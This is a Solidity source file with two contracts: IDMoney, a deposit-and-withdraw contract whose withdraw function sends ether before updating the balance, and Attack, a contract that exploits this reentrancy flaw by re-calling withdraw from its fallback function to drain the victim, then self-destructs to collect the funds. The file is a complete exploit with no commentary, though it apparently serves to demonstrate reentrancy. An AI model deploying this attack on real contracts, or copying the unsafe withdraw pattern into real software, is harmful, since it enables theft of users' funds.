pragma solidity ^0.4.19;
 
contract IDMoney{
    address _owner;
    mapping (address => uint256) balances;
    function IDMoney() {
        _owner = msg.sender; 
    }
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    function withdraw(address to, uint256 amount) public payable {
        require(balances[msg.sender] >= amount);
        require(this.balance >= amount);
         
        to.call.value(amount)();
        balances[msg.sender] -= amount;
    }
    function balanceof(address to) constant returns(uint256){
        return balances[to];
    }
}
 
contract Attack {
    address owner;
    address victim;
    IDMoney idmoney;
    modifier ownerOnly { require(owner == msg.sender); _; }
     
    function Attack() payable { owner = msg.sender; }

    function setVictim(address target) ownerOnly { victim = target;  idmoney = IDMoney(target);}
     
    
    function step1(uint256 amount) ownerOnly payable {
        if (this.balance > amount) {
           victim.call.value(amount)(bytes4(keccak256("deposit()")));
        }
    }
    
    function step2(uint256 amount) ownerOnly {
       idmoney.withdraw(address(this), amount);
    }
    
    function stopAttack() ownerOnly {
        selfdestruct(owner);
    }
 
    function startAttack(uint256 amount) ownerOnly {
        step1(amount);
        step2(amount / 2);
    }
 
    function () public payable {
      idmoney.withdraw(address(this), msg.value);5;
    }
}

